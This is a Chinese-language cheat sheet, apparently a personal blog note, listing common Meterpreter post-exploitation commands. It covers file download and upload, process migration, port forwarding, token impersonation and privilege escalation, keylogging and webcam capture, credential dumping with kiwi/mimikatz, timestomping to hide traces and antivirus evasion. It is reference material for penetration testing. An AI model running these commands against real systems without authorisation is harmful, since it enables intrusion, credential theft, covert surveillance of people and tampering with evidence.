---
icon: pen-to-square
date: 2025-04-26
tags: 
title: meterpreter常用命令
category:
  - 项目
---
以下是 Meterpreter 常用命令的整理，涵盖文件操作、系统控制、信息收集、权限提升等渗透测试场景：

---

**一、基础命令**
1. `help`  
   • 查看所有可用命令及说明。


2. `background`  
   • 将当前会话切换到后台（返回MSF控制台）。


3. `sessions`  
   • 在MSF中查看所有活跃会话，`sessions -i <ID>` 重新进入指定会话。


4. `sysinfo`  
   • 查看目标系统信息（OS、架构、主机名等）。


5. `getuid`  
   • 显示当前权限（如 `NT AUTHORITY\SYSTEM`）。


6. `exit` 或 `quit`  
   • 终止当前Meterpreter会话。


---

**二、文件操作**
1. `pwd` 或 `getwd`  
   • 查看当前工作目录。


2. `cd`  
   • 切换目录（支持 `C:\\` 或 `C:/` 格式）。


3. `ls` 或 `dir`  
   • 列出当前目录下的文件和子目录。


4. `cat`  
   • 读取文件内容：  

     ```bash
     meterpreter > cat C:\\flag.txt
     ```

5. `download`  
   • 下载文件到攻击机：  

     ```bash
     meterpreter > download C:\\secret.txt /home/kali/
     ```

6. `upload`  
   • 上传本地文件到目标：  

     ```bash
     meterpreter > upload /tmp/payload.exe C:\\Windows\\Temp
     ```

7. `edit`  
   • 用默认编辑器修改文件（需权限）。


8. `rm` 或 `del`  
   • 删除文件：  

     ```bash
     meterpreter > rm C:\\temp\\logs.txt
     ```

9. `mkdir`  
   • 创建目录：  

     ```bash
     meterpreter > mkdir C:\\hacked
     ```

---

**三、系统控制**
1. `shell`  
   • 进入目标系统的命令行（CMD或Bash），`exit` 返回Meterpreter。


2. `execute`  
   • 执行系统命令：  

     ```bash
     meterpreter > execute -f cmd.exe -i    # 交互式CMD
     meterpreter > execute -f "calc.exe"     # 启动计算器
     ```

3. `ps`  
   • 列出所有正在运行的进程。


4. `migrate`  
   • 迁移到其他进程（提升稳定性或权限）：  

     ```bash
     meterpreter > migrate <PID>    # 迁移到指定进程（如explorer.exe）
     ```

5. `kill`  
   • 终止指定进程：  

     ```bash
     meterpreter > kill <PID>
     ```

6. `getpid`  
   • 查看当前Meterpreter的进程ID。


7. `reboot` 或 `shutdown`  
   • 重启或关闭目标系统。


---

**四、网络操作**
1. `ipconfig`  
   • 查看目标网络接口信息（IP、网关等）。


2. `portfwd`  
   • 端口转发（将目标内网端口映射到本地）：  

     ```bash
     meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100
     ```

3. `route`  
   • 查看目标内网路由表，辅助内网渗透。


---

**五、权限提升**
1. `getsystem`  
   • 尝试提权到SYSTEM权限（依赖漏洞利用）。


2. `load incognito`  
   • 加载令牌模拟模块：  

     ```bash
     meterpreter > list_tokens -u    # 列出可用令牌
     meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"  # 模拟令牌
     ```

3. `bypassuac`  
   • 绕过UAC（需配合模块使用）。


---

**六、信息收集**
1. `run post/windows/gather/arp_scanner`  
   • 扫描目标内网ARP表。


2. `run post/windows/gather/enum_logged_on_users`  
   • 枚举已登录用户。


3. `keyscan_start` 和 `keyscan_dump`  
   • 启动键盘记录并导出击键内容（需迁移到用户进程）。


4. `screenshot`  
   • 截取目标屏幕：  

     ```bash
     meterpreter > screenshot /tmp/screen.png
     ```

5. `webcam_list` 和 `webcam_snap`  
   • 列出摄像头设备并拍摄照片。


---

**七、其他实用功能**
1. `run vnc`  
   • 启动VNC远程桌面（需权限）。


2. `load kiwi` 或 `load mimikatz`  
   • 加载密码提取工具（获取明文密码或哈希）：  

     ```bash
     meterpreter > creds_all    # 提取所有凭据
     ```

3. `timestomp`  
   • 修改文件时间戳（隐藏痕迹）。


---

**注意事项**
1. 路径格式：使用 `C:\\` 或 `C:/`，避免单反斜杠。
2. 权限依赖：部分命令需管理员或SYSTEM权限。
3. 进程迁移：尽量迁移到稳定进程（如 `explorer.exe`）。
4. 规避检测：使用 `migrate` 和 `inject` 避免被杀毒软件拦截。
5. 使用 `help` 查看详细命令：  
   ```bash
   meterpreter > help <命令名>
   ```